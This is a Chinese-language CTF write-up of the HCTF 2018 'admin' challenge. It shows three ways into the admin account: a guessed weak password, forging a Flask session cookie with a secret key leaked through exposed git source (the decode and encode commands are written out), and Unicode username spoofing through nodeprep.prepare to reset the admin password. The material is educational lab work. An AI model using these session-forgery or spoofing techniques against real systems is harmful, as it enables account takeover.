---
title: '[HCTF 2018]admin wp'
tags:
  - CTF-WEB
categories: []
date: 2020-05-03 18:41:00
---
# 题目说明

题目来源于BUUCTF,链接：[点我查看](https://buuoj.cn/challenges#[HCTF%202018]admin)

# 玄学 非预期解

题目名称为admin,应该是让用admin登录

源码中也印证了这一点

![image-20200503180231244](https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200503180231244.png)

登录页面乱输密码试了下，输入123时然后它就登进去了！！！

这样的话暴力破解也能得到flag,但是以buuctf的web题难度想着不可能那么简单，于是搜了下wp，结合别人的wp又学到了不少，在此记录下

# flask session伪造(也是非预期解)

flask中session是存储在客户端cookie中的，也就是存储在本地。我们可以修改session达到伪造admin用户的效果。

github有相应的脚本：[点我查看](https://github.com/noraj/flask-session-cookie-manager)

但是session是加密的，我们需要知道秘钥才能修改session

## 找秘钥

注册个账号登录后在修改密码页面有git源码

![image-20200503180730036](https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200503180730036.png)

下载下来在config.py中发现秘钥

![image-20200503181122457](https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200503181122457.png)

## 伪造session

然后我们就可以用脚本伪造session了

先解密原来的session

```python
python3 flask_session_cookie_manager3.
py decode -s "ckj123" -c ".eJw9kMGKwjAQhl9lmbOHbZuT4EFIt2whEwpTy-Qirq0mqXGhKtqI775VFk8D__fzDTN3WO-G7mRhfh4u3QzWroX5HT5-YA7YVAk2amRCz7FPlVQCCyU4_QrGo9XSOKS9UN5YDqseJaco-9uUZVqWjklFDtOMedQyv2qqMlPkV-ON51BHLMrA0QZTrJx6OqkNnNbTzjxTTTX1sMenI1YjFsbqphaKeNQNZ-hLr2krmFpn5HIBjxlsT8Nuff7tu-P7BE15ogu0iozTzXdkvxSY5qMie-C4F0aW1pBKkaqIobpxPHi8Ll46Fzb77m2qDytU_-S4CROABGZwOXXD62eQfMLjD-mobCE.Xq5sUg.8y1k1rWI_KY5cx0H4qGeLmOYtLw"
```

![image-20200503181724452](https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200503181608834.png)



然后修改name为admin

```python
python3 flask_session_cookie_manager3.
py encode -s "ckj123" -t "{'_fresh': True, 'name': 'admin', 'image': b'RUM3', 'user_id': '10', '_id': b'5d55c2a3cc960384c8caff3a86b58826abed46649158782ba33bbbc13810947da0f6cbe34bfc8fdeb3afe7fce55a71d0f3d533c424fa9e81629f762c978a7bd0', 'csrf_token': b'9158ca16b9b3b087a218ec88d2ae365436d1c9c7'}"
```

![image-20200503182645495](https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200503181802317.png)



原来的session是这个样子

![image-20200503181608834](https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200503181724452.png)

我们把左边的session修改成上面的session

![image-20200503181832435](https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200503181832435.png)

就成功伪造了admin用户拿到flag

# unicode欺骗(预期解法)

其实这个解法才是原作者预期解法，只不过当时作者写的代码不打严谨，导致出现了许多非预期解法。

阅读源码，我们可以发现注册登录修改密码都用到了strlower转换成小写。而且这个函数是自定义的

```python
def strlower(username):
    username = nodeprep.prepare(username)
    return username
```

对于nodeprep.prepare函数就存在漏洞

对于字符ᴬ，调用一次函数会转换成A,再调用一次会转换成a

所以我们注册一个名为ᴬdmin的用户，正常登录。首页会显示我们的用户名为Admin

如果我们用Admin去修改密码，首先它调用strlower函数会把Admin转换为admin，这样我们其实就相当于改了admin的密码

![image-20200503181802317](https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200503182645495.png)

然后我们用admin用户和刚才修改的密码即可登录

# 写在最后

尽管出题人疏忽了，但对我们而言又学到了许多姿势，继续加油吧！